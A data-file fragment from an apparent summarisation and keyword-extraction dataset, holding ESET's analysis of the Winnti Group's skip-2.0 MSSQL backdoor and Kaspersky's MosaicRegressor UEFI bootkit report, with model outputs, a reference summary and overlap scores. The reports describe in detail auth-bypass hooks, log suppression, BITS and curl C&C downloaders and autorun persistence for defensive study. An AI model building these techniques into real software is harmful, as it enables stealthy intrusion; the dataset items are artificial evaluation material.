backdoor as well as the payload embedded in the compromised video As described in our previous article, the packer con\ufb01guration contains the decryption key of the packed binary as well as its original \ufb01lename, its size and the execution type (EXE or DLL). The payload\u2019s packer con\ufb01guration is shown in Table 1.Parent SHA-1Payload SHA-1RC4 keyFilenameLaunch typeurl Group\u2019s skip2.0: A Microsoft SQL Server backdoor | WeLiveSecurityParent SHA-1 9aafe81d07b3e5b\u2010 b282608f0a2a4656eb485b7c9Payload SHA-1 2Table 1. Payload\u2019s packer con\ufb01guration One can see from the packer con\ufb01guration that the payload is called Inner-Loader. Inner-Loader is the name of an injector that is the part of the Winnti Group\u2019s arsenal used to inject the PortReuse backdoor into processes listening on a particular port, as described in our previous publication. Beyond that identical name, by analyzing this payload it appears that it is another variant of the Inner-Loader injector. Inner-Loader injector This variant of Inner-Loader, instead of looking for a process listening on a particular port, as in the case when injecting the PortReuse backdoor, looks for a process called sqlserv.exe, which is the conventional process name of MSSQL Server. If found, Inner-Loader then injects a payload into this process. This payload is also packed with the custom packer \u2013 the packer con\ufb01guration of that payload is shown in Table 2.Parent SHA-1 a2571946ab181657e\u2010 b825cde07188e8bcd689575Payload SHA-1 2.0.dllLaunch type 2Table 2. Packer con\ufb01guration of the payload embedded in Inner-Loader The original \ufb01lename of this injected payload is skip-2.0.dll. skip-2.0 After having been injected and launched by Inner-Loader, skip-2.0 \ufb01rst checks whether it is executing within an sqlserv.exe process and if so, retrieves a handle to sqllang.dll, which is loaded by sqlserv.exe. It then proceeds to \ufb01nd and hook multiple functions from that DLL. Figure 2 depicts the skip-2.0 chain of compromise.url Group\u2019s skip2.0: A Microsoft SQL Server backdoor | WeLiveSecurityFigure 2. skip-2.0 unpacking and injectionHooking sqllang.dll The hooking procedure used by skip-2.0 is very similar to the one used by NetAgent, the PortReuse module responsible for installing the networking hook. This hooking library is based on the distorm open source disassembler that is used by multiple open source hooking frameworks. In particular, a disassembling library is needed to correctly compute the size of the instructions to be hooked. One can see in Figure 3 that the hooking procedure used by NetAgent and skip-2.0 are almost identical.url Group\u2019s skip2.0: A Microsoft SQL Server backdoor | WeLiveSecurityFigure 3. Hex-Rays output comparison between the NetAgent (left) and skip-2.0 (right) hooking proceduresThere is one notable difference, which is the fact that the hooking function from skip-2.0 takes the address of the hook to be installed as argument, while for NetAgent, the address of the hook to install is hardcoded. This is due to the fact that skip-2.0 has to hook multiple functions in sqllang.dll to operate properly, while NetAgent only targets a single function.To locate each sqllang.dll functions to be hooked, skip-2.0 \ufb01rst retrieves the size of the DLL once loaded in memory (i.e. its virtual size) by parsing its PE headers. Then an array of bytes to be matched within sqllang.dll is initialized as shown in Figure 4. Once the address of the \ufb01rst occurrence matching the byte array is found, the hook is installed using the procedure shown in Figure 3.Figure 4. Hex-Rays output of the procedure initializing the byte array to match in sqllang.dllThe success of the hook installation is then logged in cleartext in a log \ufb01le located at the hardcoded path C:\\Windows\\Temp\\TS_2CE1.tmp and shown in Figure 5.url Group\u2019s skip2.0: A Microsoft SQL Server backdoor | WeLiveSecurityFigure 5. Log generated during hooks installationShould the targeted function not be found, the hook installer searches for a fallback function, with a different set of byte patterns.Matching a sequence of bytes to locate the address of the targeted function instead of using a static offset, plus as using a fallback sequence of bytes, allows skip-2.0 to be more resilient to MSSQL updates and to potentially target multiple sqllang.dll updates. One password to rule them all The functions targeted by skip-2.0 are related to authentication and event logging. The targeted functions include:CPwdPolicyManager::ValidatePwdForLogin XeSqlPkg::sql_statement_completed::Publish XeSqlPkg::sql_batch_completed::Publish SecAuditPkg::audit_event::Publish XeSqlPkg::login::Publish XeSqlPkg::ual_instrument_called::PublishThe most interesting function is the \ufb01rst one (CPwdPolicyManager::ValidatePwdForLogin), which is responsible for validating the password provided for a given user. This function\u2019s hook checks whether the password provided by the user matches the magic password, in that case, the original function will not be called and the hook will return 0, allowing the connection even though the correct password was not provided. A global \ufb02ag is then set that will be checked by the other hooked functions responsible for event logging. The corresponding decompiled procedure is shown in Figure 5. In the case where this global \ufb02ag is set, the hooked logging functions will silently return without calling their corresponding, original functions, so the action will not be logged. In the case where a different password is provided, the original function is called.url Group\u2019s skip2.0: A Microsoft SQL Server backdoor | WeLiveSecurityFigure 6. Hex-Rays output of the procedure responsible for matching the password providedat login with the hardcoded stringA similar backdooring technique, based on hardcoded passwords, was used with SSH backdoors previously discovered by ESET. The difference here is that skip-2.0 is installed in-memory, while in the case of the SSH backdoors the sshd executable was modi\ufb01ed prior to execution.Additionally, CSECAuthenticate::AuthenticateLoginIdentity will be called from within its hook code but the hook will always return 0. The ReportLoginSucess and IssueLoginSuccessReport hooks will not call the original functions if the magic password was used to log in. The same behavior is applied to FEExecuteLogonTriggers. Other logging functions such as XeSqlPkg::sql_statement_completed::Publish or XeSqlPkg::sql_batch_completed::Publish will also be disabled in the case where the user logged in with the magic password. Multiple audit events are disabled as well, including SecAuditPkg::audit_event::Publish, XeSqlPkg::login::Publish and XeSqlPkg::ual_instrument_called::Publish.This series of hooks allows the attacker not only to gain persistence in the victim\u2019s MSSQL Server through the use of a special password, but also to remain undetected thanks to the multiple log and event publishing mechanisms that are disabled when that password is used.We tested skip-2.0 against multiple MSSQL Server versions and found that we were able to login successfully using the special password with MSSQL Server 11 and 12. To check whether a particular sqllang.dll version is targeted by skip-2.0 (i.e., that matches the byte patterns), we created a YARA rule, which can be found in our GitHub repository. Connection with the Winnti Group We observed multiple similarities between skip-2.0 and other tools from the Winnti Group\u2019s arsenal. Its VMProtected launcher, custom packer, Inner-Loader injector and hooking framework are part of the already known toolset of the Winnti Group. This leads us to think that skip-2.0 is also part of that toolset. Conclusion The skip-2.0 backdoor is an interesting addition to the Winnti Group\u2019s arsenal, sharing a great deal of similarities with the group\u2019s already known toolset, and allowing the attacker to achieve persistence on an MSSQL Server. Considering that administrative privileges are required for installing the hooks, skip-2.0 must be used on already compromised MSSQL Servers to achieve persistence and stealthiness.We will continue to monitor new activities of the Winnti Group and will publish relevant information on our blog. For any inquiries, contact us at threatintel@eset.com. Indicators of Compromise (IoCs)url Group\u2019s skip2.0: A Microsoft SQL Server backdoor | WeLiveSecurityComponent Component VMP LoaderInner-Loader injectorskip-2.0Known targeted sqllang.dll \ufb01les (non- exhaustive list)SHA-1 t.HXA2571946AB181657EB825CDE07188E8BCD689575 Win64/In\u2010 jector.BS60B9428D00BE5CE562FF3D888441220290A6DAC7 Win32/Ag ent.SOKN/A4396D3C904CD340984D474065959E8DD11915444 B63MITRE ATT&CK techniquesTactic skip-2.0 is started with the SessionEnv servicePersis\u2010 tenceT1038 DLL Search Or\u2010der Hijackingskip-2.0 probably uses a DLL hijacking technique against the Ses\u2010 sionEnv serviceT1179 Hookingskip-2.0 hooks multiple functions in sqllang.dll service to bypass authentication and maintain stealthDefense EvasionT1054Indicator Blockingskip-2.0 blocks event loggingT1045 Software PackingT1057 Process Discoveryskip.2-0 and Inner-Loader are packed using Winnti's custom pack\u2010 er. Further, the launcher is VMProtected.Inner-Loader lists running processes in order to \ufb01nd the process running MSSQL ServerDiscoveryImpactT1485 Data Destructionskip-2.0 allows unauthorized access to MSSQL databases, allow\u2010 ing data destruction or tamperingT1494 Runtime Data Manipulationskip-2.0 manipulates event logging at runtimeurl Group\u2019s skip2.0: A Microsoft SQL Server backdoor | WeLiveSecurityTacticIDNameDescriptionT1492 Stored Data Manipulationskip-2.0 allows unauthorized access to MSSQL databases, allow\u2010 ing manipulation of stored dataMathieu Tartare 21 Oct 2019 - 11:30AMurl ", "generated_text": "port; Skip; a Microsoft SQL server backdoor; at least 2012; the Winnti Group; the attacks; the video game and software industry; this backdoor; similarities; the PortReuse backdoor; Winnti Group toolset; the VMProtected launcher; the port; key; the payload; encryption; the VMProtected launcher; the payload; the VMProtected launcher; C2; the VMProtected launcher; PowerShell; the BYOB file; a custom packer; VMProtected launcher; the VMProtected launcher; this backdoor; the Winnti Group; list; security solutions.", "ref_text": "<START-1>The document describes analysis of a new backdoor called skip-2.0 used by the Winnti cyberespionage group to target Microsoft SQL Server. Winnti has been active since at least 2012 conducting supply chain attacks against the video game and software industries. Skip-2.0 allows the attacker to stealthily connect to any MSSQL account using a hardcoded magic password. It achieves this by installing hooks in the sqllang.dll library used by MSSQL Server to bypass authentication and disable logging of the unauthorized access. The malware uses the same VMProtected launcher, custom packer, and injector techniques seen in other Winnti tools like PortReuse and ShadowPad. An injector called Inner-Loader injects the skip-2.0 DLL into the sqlserv.exe process. Skip-2.0 locates and hooks functions in sqllang.dll related to password validation, logging, and auditing using pattern matching. If the magic password is provided, the hooks spoof validation and disable logging. This gives Winnti stealthy persistence and access to manipulate or steal data from compromised MSSQL Servers. Skip-2.0 was found to be effective against MSSQL Server versions 11 and 12. The malware shares multiple similarities with other Winnti tools, leading researchers to attribute it to their arsenal for targeted cyberespionage campaigns. Defenses like monitoring for anomalies and enforcing certificate validation are recommended. <END-1>", "t5/keyword/hint_hit_precision": 0.16666666666666666, "t5/word/hint_hit_recall": 0.0392156862745098, "gpt3/lexical/rouge_rouge1": 0.4476744186046512, "gpt3/lexical/rouge_rouge2": 0.1929824561403509, "gpt3/lexical/rouge_rougeL": 0.29069767441860467, "gpt3/lexical/rouge_rougeLsum": 0.29069767441860467, "gpt3_generated_text": ["This article discusses the discovery of a new backdoor called skip-2.0 by the Winnti Group, a cyberespionage group active since at least 2012. The backdoor targets Microsoft SQL Server 11 and 12, allowing attackers to stealthily connect to MSSQL accounts and manipulate database content. The backdoor shares similarities with the PortReuse backdoor and uses the same custom packer and VMProtected launcher. The article highlights technical details of the MSSQL Server backdoor, its encryption, persistence, and attribution to the Winnti Group's toolset. The article also mentions the use of VMProtected launchers, the embedded payload, and the Winnti Group's custom packer. This backdoor poses a significant threat to organizations and underscores the importance of implementing robust security solutions to protect against advanced cyber threats."]}, {"split_name": "val", "sample_id": "val_24", "prompt_text": "Extract the keywords: MosaicRegressor: Lurking in the Shadows of UEFITechnical detailsContentsUEFI Bootkit RAR SFX droppers for the Curl-based downloaders BITS DownloadersMain thread C&C Communication BITS Transfer Loading the DLL modules BITS Downloader, extended BITS Downloader, extended, MSVC 10 version BITS Downloader, \u201cHHDump.dll\u201d BITS Downloader, \u201ccryptui.sep\u201d BITS Downloader, 64-bitCurl-based downloadersC&C communication Payload ABI Notable file properties C&C URLs Payload DLL names C&C communication delay Curl-based downloader, extended C&C communication Payload Curl downloader, \u201cOINFO11.OCX\u201d Rich header dump WinRAR wrapper \u201cload.rem\u201d Load Intermediate DLL loader \u201cmapisp.dll\u201d CryptoSysPrepE-mail downloader\u201cProcess\u201d functionOLE2 Equation dropperPayload of the OLE2 dropper, \u201cData.dll\u201dLauncher for the Curl downloader Winhttp-based downloaders, extendedC&C addresses and file names Modification with the \u201cID\u201d field C&C addresses and file names23 30MosaicRegressor is a multi-stage and modular framework aimed at espionage and data gathering. It consists of downloaders, and occasionally multiple intermediate loaders, that are intended to fetch and execute payload on victim machines. In two known cases, the initial stage of the framework was installed in the victim\u2019s UEFI firmware, achieving the above-OS level of persistence.UEFI BootkitWhen inspecting the compromised UEFI firmware, we noticed four components that had unusual proximity in their assigned GUID values. These were two DXE drivers and two UEFI applications. Upon closer analysis, we could conclude that those were compiled from the source code of a Hacking Team bootkit named VectorEDK, that was leaked in 2015 and is now available online.Rogue components found within the compromised UEFI firmwareFollowing is an outline of the revealed components:F5B320F7E87CC6F9D02E28350BB87DE6 (SmmInterfaceBase) DD8D3718197A10097CD72A94ED223238 (Ntfs)\u2022 SmmInterfaceBase: a DXE driver intended to deploy the bootkit itself on the system by registering a callback that willbe invoked upon an event of type EFI_EVENT_GROUP_READY_TO_BOOT. The event occurs at a point when control can be passed to the operating system\u2019s bootloader, effectively allowing the callback to take effect before it. The callback will, in turn, load and invoke further components of the bootkit, in this case \u2018SmmAccessSub\u2019. This is equivalent to Hacking Team\u2019s \u2018rkloader\u2019 component, and is built using its source code.\u2022 Ntfs: a driver used to parse the NTFS file system to allow reading or writing to disk.\u2022 SmmReset: a UEFI application intended to mark the execution of the bootkit. This is done by setting the value of avariable named \u2018fTA\u2019 to a hard-coded GUID. The same is done by the original Vector-EDK bootkit as part of the bootkit\u2019s main business logic. In this case, it\u2019s not invoked and it seems to be a residue from the open source code that was not properly leveraged by the developers.Setting of the fTA variable with a predefined GUID to mark the execution of the bootkit3\u2022 SmmAccessSub: the main bootkit component that serves as a persistent dropper for user-mode malware. It is executed by the callback registered during the execution of \u2018SmmInterfaceBase\u2019, and takes care of writing a binary embedded within it as a file named \u2018IntelUpdate.exe\u2019 to the startup directory on disk. This allows the binary to run when Windows accomplishes the boot process. This is the only proprietary component amongst the ones we inspected, which doesn\u2019t rely on Vector-EDK code. It conducts the following actions to drop the intended file to disk: \u2013 Bootstraps pointers for SystemTable, BootServices and RuntimeServices global structures.\u2013 Tries to get a handle to the currently loaded image by invoking the HandleProtocol method with the EFI_LOADED_IMAGE_PROTOCOL_GUID argument.\u2013 If it succeeds, it attempts to find the root drive with Windows installation by enumerating all drives and checking that the \u2018\\Windows\\System32\u2019 directory exists. A global EFI_FILE_PROTOCOL object that corresponds to the drive will be created at this point and referenced to open any further directories or files on this drive.\u2013 If the root drive is found, it looks for a marker file named \u2018setupinf.log\u2019 under the Windows directory and proceeds onlyif it doesn\u2019t exist. In the absence of this file, it is created.\u2013 If the creation of \u2018setupinf.log\u2019 succeeds, it goes on to check if the \u2018Users\u2019 directory exists on the same drive.\u2013 If the \u2018Users\u2019 directory exists, it writes the \u2018IntelUpdate.exe\u2019 file (embedded in the UEFI application\u2019s binary) under the\u2018\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\u2019 directory.Code from \u2018SmmAccessSub\u2019 used to write the embedded \u2018IntelUpdate.exe\u2019 binary to the Windows startup directory4RAR SFX droppers for the Curl-based downloadersThese are several SFX droppers with decoy documents that were sent to victims by e-mail. Each contains a document and Path=%appdata% Setup=%appdata%\\1.docx Setup=%appdata%\\msreg.exe Path=%appdata% Setup=%appdata%\\6.docx Setup=%appdata%\\msreg.exe Simplified Chinese font \u201cSimSun\u201d but is unreadable and looks like a result of incorrect encoding.RAR SFX script: Path=%appdata% Setup=winword.exe Setup=contract.doc Path=%appdata% Setup=%appdata%\\6.docx Setup=%appdata%\\msreg.exe Simplified Chinese font \u201cSimSun\u201d but is unreadable and looks like a result of incorrect encoding.RAR SFX script: Path=%appdata% Setup=winword.exe Setup=contract.doc Path=%appdata% Setup=dwhost.exe Setup=0612.doc Path=%appdata% Setup=return.exe Setup=1206.doc Path=%appdata% Setup=dwhost.exe Setup=0927.doc Silent=1 display name \u201ctest\u201d of type BG_JOB_TYPE_UPLOAD. It creates a mutex to ensure only one instance is being executed.10Mutex name: \u201cFindFirstFile Message Bi\u201dEnumerates all BITS jobs. For a job whose display name contains the substrings \u201cfirst_tf\u201d or \u201csecond_tf\u201d and overall display name is five or six characters (this never happens since the conditions are contradictory), it cancels the job, effectively interrupting the transfer and removing temporary files. Then the module follows its business logic in a separate thread while running an empty window message loop in the startup thread.Main thread The program contains four blocks of data encrypted with a simple one-byte XOR algorithm. Three of those blocks contain URL strings and the fourth contains a unique string, \u201cD22\u201d.It builds an identification string following the format: %Computer name%-D22_32 or 64The 32 or 64 suffix is chosen based on system identification. The system is supposed to be 64 if the program is able to locate the file or directory named %WINDIR%\\SysWOW64The program then follows into an infinite C&C communication loop. It delays for a hardcoded period of 20 minutes between each attempt.C&C Communication The module compiles a final URL string following the format: URL from the decrypted buffer/identification string/on.zIt then attempts to download the contents of that URL to the file %TEMP%\\on.dat using its BITS transfer routine. The contents of the file areignored and the file is deleted immediately after transfer. This initial download is used to determine the valid C&C server. The module iterates through all three URLs hardcoded in its body and uses the first one that responds without error for further communication.In case any of the C&C servers provided a valid response, the program sends another download request for: URL of the valid C&C server/identification string/BeFileA.z The downloaded contents are then saved to: %TEMP%\\BeFileA.dllIt also tries to fetch the file using the URL: URL of the valid C&C server/identification string/BeFileC.z and save it to: %TEMP%\\BeFileC.dllThe file \u201cBeFileA.dll\u201d is downloaded only once during the duration of the program\u2019s instance and is loaded in a separate thread. The attempts to download the file \u201cBeFileC.dll\u201d occur in every communication period. The file is loaded in the same thread.BITS Transfer The program creates a new BITS job. For a download job it names the job \u201cfirst_tf\u201d and for the upload tasks it uses the name \u201csecond_tf\u201d. Other versions use slightly different strings as job names but they all start with \u201cfirst\u201d and \u201csecond\u201d correspondingly, and are always identical to the names of the jobs that are cancelled during the startup. The job is started with the priority setting \u201cBG_JOB_PRIORITY_FOREGROUND\u201d. It also toggles the security options \u201cBG_SSL_IGNORE_ CERT_CN_INVALID\u201d, \u201cBG_SSL_IGNORE_CERT_DATE_INVALID\u201d, \u201cBG_SSL_IGNORE_UNKNOWN_CA\u201d, to accept invalid HTTPS certificates.It then waits for up to about five minutes for the BITS job to complete, also extending the wait if the actual transfer is in progress.11Loading the DLL modules The module expects the files provided by the C&C server to be PE DLLs. They are loaded normally using the LoadLibrary API function. Each DLL may have one or more exported functions named \u201cCallA\u201d, \u201cCallB\u201d, \u201cCallC\u201d, \u201cCallD\u201d, \u201cCallE\u201d.All exported functions are supposed to have the same ABI: cdecl calling convention, five arguments all passed by pointers. Following the execution of each function the program delays for one second and then processes the results returned in these arguments. Depending on the data returned by the exported function, the program may then download or upload arbitrary files from/to arbitrary URLs using its BITS transfer routine. Also, depending on the returned data, it may delete or leave the DLLs file on disk.Then it checks if a corresponding \u201cdat\u201d file exists in the %TEMP%directory. In case the file exists it uploads it to the C&C server using the BITS transfer routine, the same URL except the last component is identical to the actual filename. The different mutex name: \u201cset instance state\u201d.After starting the C&C communication thread, the program sets the registry value HKEY_CURRENT_USER\\Software\\ Microsoft\\Windows\\CurrentVersion\\Run, value name qwinstd, to the location of its own executable. It also overwrites the value if it is not equal to the location of the executable. This ensures the program\u2019s automatic startup. Also the program sets up a timer callback routine to be called every second. The routine looks for the file %APPDATA%\\Microsoft\\Internet Explorer\\usk.rs. When such a file is found it acts as a kill switch: the file deleted, the BITS Jobs are cancelled and the program exits.Instead of the %TEMP% directory this version uses the directory %APPDATA%\\Microsoft\\Internet Explorer to store its temporary files.12System information The module creates a text file %APPDATA%\\Microsoft\\Internet Explorer\\%Computername%.dat and fills it with system information. Note the non-ASCII symbols 0xA3 and 0xBE used in the string literals. These were replaced with a colon character (See \u201cLanguage artifacts\u201d).Host Infomation: EXE ID: %Unique ID, see table% Host Name: %Computername% Current User Name: %USERNAME% PRIVILEGE: %User privilege% OS: Windows NT %Major%.%Minor%\\t%Service pack string%\\t%Product type%\\tSystemMetrics: %Build number for Windows 5.2%\\tSuiteMask hex: %Suite mask% OS BITS: %32 or 64% Host Power ON Time: %04d-%02d-%02d %02d:%02d Power ON Time: %d Hours %2d Minutes %2d Seconds *or*Power ON Time: %2d Minutes %2d Seconds Installed Programe List 32: *the following list is the contents of registry keys from HKLM\\SOFTWARE\\Microsoft\\Windows\\ CurrentVersion\\Uninstall* *%Item number%* *%Registry key last write timestamp in format %04d-%02d-%02d %02d:%02d%* *optional, when the program determines that it is running on a 64-bit OS, it disables 64/32 registry reflection and enumerates the installed program list again, generating a similar list with a header \u201cInstalled Programe List 64\u201d*Remarks. The %User privilege% string is produced using the NetUserGetInfo API for the current user. Depending on the returned result, it can be one of the strings: \u201cAdministrator\u201d, \u201cUser\u201d, \u201cGuest\u201d, \u201cACCESS_DENIED\u201d, \u201cCOMPUTER_ NAME_ERROR\u201d, \u201cUSER_NAME_ERROR\u201d. The %Product type% string is one of \u201cVER_NT_SERVER\u201d,\u201cVER_NT_DOMAIN_ CONTROLLER\u201d, \u201cVER_NT_WORKSTATION\u201dOnce the report file is ready, the program creates a BITS job to upload it to the C&C server. The upload location follows the format: URL of the C&C server/%Computername%.dat The file is deleted if the upload succeeds.13Payload When finished with uploading the system information report, the program then attempts to fetch the payload from the C&C server. The business logic is similar to the one of the \u201cBITS Downloader\u201d, with the following differences:Files that are downloaded and executed in separate threads:FileA.dll fetched from %C&C URL%/%Computername%/FileA.zFileB.dll fetched from %C&C URL%/%Computername%/FileB.zFiles that are downloaded and executed in the current thread:FileC.dll fetched from %C&C URL%/%Computername%/FileC.zFileD.dll fetched from %C&C URL%/%Computername%/FileD.zEach DLL may have one or more exported functions named \u201cCallA\u201d, \u201cCallB\u201d, \u201cCallC\u201d, \u201cCallD\u201d, \u201cCallE\u201d, \u201cCallF\u201d, \u201cCallG\u201d, \u201cCallH\u201d, Many strings contain the sequence 0xA3, 0xBE (hexadecimal). This is an invalid sequence for a UTF8 string and the LATIN1 encoding translates these symbols to a pound sign followed by a \u201cmasculine ordinal indicator\u201d (\u201c\u00a3\u00ba\u201d).\u0414anguage artifactsAn attempt to iterate over all available iconv symbol tables trying to convert to UTF-8 produces possible candidates that produce a more meaningful conversion for this byte sequence: CN-GB//, \u201c : \u201d # EF BC 9A CP936//, \u201c : \u201d # EF BC 9A CP949//, \u201c : \u201d # EF BC 9A CSEUCKR//, \u201c : \u201d # EF BC 9A CSGB2312//, \u201c : \u201d # EF BC 9A EUC-CN//, \u201c : \u201d # EF BC 9A EUC-KR//, \u201c : \u201d # EF BC 9A EUCCN//, \u201c : \u201d # EF BC 9A EUCKR//, \u201c : \u201d # EF BC 9A GB2312//, \u201c : \u201d # EF BC 9A GB13000//, \u201c : \u201d # EF BC 9A GB18030//, \u201c : \u201d # EF BC 9A GBK//, \u201c : \u201d # EF BC 9A ISIRI-3342//, \u201c!:\u201d # 21 3A ISIRI3342//, \u201c!:\u201d # 21 3A MS936//, \u201c : \u201d # EF BC 9A MSCP949//, \u201c : \u201d # EF BC 9A OSF0004000A//, \u201c : \u201d # EF BC 9A OSF100203B5//, \u201c : \u201d # EF BC 9A UHC//, \u201c : \u201d # EF BC 9A WINDOWS-936//, \u201c : \u201d # EF BC 9A Given the context of the string preceding the symbol and line feed symbols following it, the best match is the \u201cFULLWIDTH empty; all the business logic is implemented in the DllMain function.The DllMain function, when executed with the reason code of DLL_PROCESS_ATTACH, checks if the filename of the host The module checks for the presence of the file %APPDATA%\\Microsoft\\Windows\\load.rem. If the file is present it follows in a new thread: it copies it to %APPDATA%\\Microsoft\\Windows\\SendTo\\load.dll, then loads the copy as a regular DLL and calls its function exported with the name \u201cLoad\u201d, if present. The copy is deleted if the module fails to load it as a DLL.Main thread The module enumerates and cancels BITS jobs if their names contain a substring \u201cfirst job\u201d or \u201csecond job\u201d and the length of the name is either 9 or 10. This is an improvement over the original \u201cBITS Downloader\u201d that checked for a contradictory condition that never becomes true.The module creates a directory if it doesn\u2019t exist: %APPDATA%\\Microsoft\\Network. Due to a bug, it will not attempt to create the directory if a file exists with the same name, failing later when the directory is required. This directory is then used to store any temporary files, instead of %TEMP% in the original \u201cBITS Downloader\u201d.Files that are downloaded and executed in separate threads:DFileA.dll fetched from %C&C URL%/%Computername%/DFileA.zDFileD.dll fetched from %C&C URL%/%Computername%/DFileD.zFiles that are downloaded and executed in the current thread:DFileC.dll fetched from %C&C URL%/%Computername%/DFileC.zExported function names executed from the payload DLLs: \u201cCallA\u201d, \u201cCallB\u201d, \u201cCallC\u201d, \u201cCallD\u201d, \u201cCallE\u201d, \u201cCallF\u201d, \u201cCallG\u201d, \u201cCallH\u201d, \u201cCallI\u201d, \u201cCallJ\u201d, \u201cCallK\u201d, \u201cCallL\u201d, \u201cCallM\u201d, \u201cCallN\u201d, \u201cCallO\u201d, \u201cCallP\u201d, \u201cFinal\u201d.The signature of the function called \u201cFinal\u201d is different from the rest: it takes 21 arguments that not only contain those of a BITS Downloader. It is very similar to \u201cHHDump.dll\u201d. The following description includes only the differences.The library provides one exported function with the name \u201cRetrievePKCS7FromCA\u201d. The DllMain function is empty and the module doesn\u2019t have any checks for the name of the current executable.The payload is loaded in the same way as \u201cHHDump.dll\u201d; the only difference is an additional optional call to the function appeared in \u201cBITS Downloader, extended\u201d. It is worth noting that the part of the code that checks for, and cancels, the BITS job by name uses the same name lengths as the first \u201cBITS Downloader\u201d (5 and 6) but the correct substring literals \u201cfirst\u201d and \u201csecond\u201d.This version does not create any mutex.C&C communication period: 15 minutesThis version uses the directory %APPDATA%\\Microsoft\\Internet Explorer to store its temporary files.The module creates a text file %APPDATA%\\Microsoft\\Internet Explorer\\%Computername%.dat and writes a hardcoded string in there:LINEThe file is then uploaded to the C&C server using the same code that uploads the system information report in \u201cBITS Downloader, extended\u201d.The names of payloads, filenames and exported function names that are executed from the payload DLLs is identical to the communication routine.C&C communication The module downloads several files from its C&C server. The URL of the server is hardcoded and varies among the samples.It may download modules specific to either 32-bit or 64-bit target systems, using the suffix \u201c32\u201d or \u201c64\u201d correspondingly. For each DLL file the download routine enters an infinite loop and continues to the next module only when the current file has been download without errors. Each attempt is followed by a predefined delay that is different for each sample.The first file to download is the following:URL of the C&C server/msreg_32.dll or URL of the C&C server/msreg_64.dllThe file is saved to: %APPDATA%\\msreg.dll.Next, the module attempts to download the files:URL of the C&C server/wrtreg_32.dll, saved to %TEMP%\\wrtreg_32.dllURL of the C&C server/wrtreg_64.dll, saved to %TEMP%\\wrtreg_64.dllThis library is then loaded, unloaded and deleted. The latter two libraries are downloaded and executed only if the file msreg.dll is is nnot present on disk.19Then the module continuously attempts to download another file:URL of the C&C server/%Computername%/%PayloadName.dll, saved to %APPDATA%\\%PayloadName%.dll (%PayloadName% varies, see the list of names)The previous version of the file, if present, is moved to a temporary filename with the prefix %TEMP%\\34F and then deleted. Every time a new such file is successfully downloaded, the module starts a new thread to execute it.Payload ABI The payload file is expected to be a regular Windows DLL. The code that interacts with the library is similar to the one used in BITS Downloader. The file is loaded using the standard LoadLibraryA API function. Then it resolves the addresses of functions exported with the names \u201cExpA\u201d, \u201cExpB\u201d,\u201cExpC\u201d, \u201cExpD\u201d, \u201cExpE\u201d, \u201cExpF\u201d, \u201cExpG\u201d. The functions, if present, are then consequently called. Every function has to take five arguments passed on the stack by pointers.Depending on the returned values, the module can stop executing the exported functions, download files to disk or upload data produced by the function to the C&C server. The data is uploaded with HTTP POST request to the URL:URL of the C&C server/upload.phpThe POST request contains the part called \u201ctxt\u201d as a file attachment, with its filename and contents provided by the exported function.Notable file properties The binary is statically linked with libcurl and contains the version string \u201clibcurl/7.49.1\u201d. According to the official Curl website, version 7.49.1 was released on May 30 2016.The language identifier of the file\u2019s resources is set to 2052 (\u201czh-CN\u201d). One of the resources is its version information communication routines are similar to those found in the \u201cCurl-based downloader\u201d.Mutex name: \u201csingle UI\u201dSets the autorun registry location: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, value dsuiext=%location of the executable%.Every second the module checks for the presence of a kill switch file %APPDATA%\\Microsoft\\exitUI.rs and terminates if it is present.The module enters an infinite C&C communication loop with a preset delay between each attempt.C&C communication First, the module sends a test GET request using the URL of the C&C server and continues if the attempt succeeds. Then it collects system information and writes the results into a text file %APPDATA%\\%Computername%.dat. The code that collects the system information is identical to the one found in the \u201cBITS Downloader\u201d. Then the resulting file with the system information is sent to the C&C server in a POST request to %URL of the C&C server/upload.php. The code also checks if there is a file %APPDATA%dat present on the disk and if so the file is uploaded instead.The URL of the C&C server and the unique identifier (\u201cEXE ID\u201d) are hardcoded in the binary and encrypted with a simple one-byte XOR operation.Payload When it has finished uploading the system information report the program then attempts to fetch the payload from the C&C server. The business logic is similar to the one for \u201cBITS Downloader, extended\u201d, with the following differences:Files that are downloaded and executed in separate threads:21%APPDATA%\\Microsoft\\WebA.dll fetched from %C&C URL%/%Computername%/WebA.z%APPDATA%\\Microsoft\\WebB.dll fetched from %C&C URL%/%Computername%/WebB.zFiles that are downloaded and executed in the current thread:%APPDATA%\\Microsoft\\WebC.dll fetched from %C&C URL%/%Computername%/WebC.zEach DLL may have one or more exported functions named \u201cFunA\u201d, \u201cFunB\u201d, \u201cFunC\u201d, \u201cFunD\u201d, \u201cFunE\u201d, \u201cFunF\u201d, \u201cFunG\u201d, \u201cFunH\u201d, \u201cFunI\u201d, \u201cFunJ\u201d. Once finished, the program may delete the DLL file depending on the returned value. Depending on the data process but also deletes the autorun registry value.Rich header dump The 66 modules compiled with Visual Studio 6 are parts of the libcurl library identical to the one used in the \u201cCurl-based discovered along with one of the downloader samples.The library has an empty DllMain function and three exported functions with the names \u201cCallA\u201d, \u201cCallB\u201d, \u201cCallC\u201d. The description of these functions follows.23CallA \u2022 creates the directory %APPDATA%\\Microsoft\\Windows \u2022 deletes the file %APPDATA%\\Microsoft\\Windows\\mapisp.dll and, if this fails, renames the file to %TEMP%\\Hx101.tmp \u2022returns the values that result in the BITS Downloader, fetching the file \u201cSecondA.z\u201d from the C&C server to %APPDATA%\\Microsoft\\Windows\\mapisp.dllCallB \u2022 creates the directory %APPDATA%\\Microsoft\\Windows\\SendTo \u2022 deletes the file %APPDATA%\\Microsoft\\Windows\\SendTo\\cryptui.sep and, if this fails,renames the file to\u2022%TEMP%\\Hx102.tmp returns the values that result in the BITS Downloader, fetching the file \u201cSecondB.z\u201d from the C&C server to %APPDATA%\\Microsoft\\Windows\\SendTo\\cryptui.sepCallC \u2022 sets an autorun registry value : HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run,name mapisp to \u201crundll32.exe \u201c%APPDATA%\\Microsoft\\Windows\\mapisp.dll\u201d,CryptoSysPrep\u2022 checks if the files \u201cmapisp.dll\u201d (called \u201cfile a\u201d) and \u201ccryptiu.sep\u201d (\u201cfile b\u201d) are present \u2022 writes a log of operations into the file %APPDATA%\\Microsoft\\Internet Explorer\\FileOutA.dat and returns Strings written to the log depend on the results of the preceding operations: \u201csecond file successA\u201d \u201cfile a success\u201d or \u201cfile a error\u201d \u201cfile b success\u201d or \u201cfile b error\u201d \u201cregistry set success\u201d or \u201cregistry set error\u201d \u201cdo move file a\u201d or \u201cdo not move file a\u201d 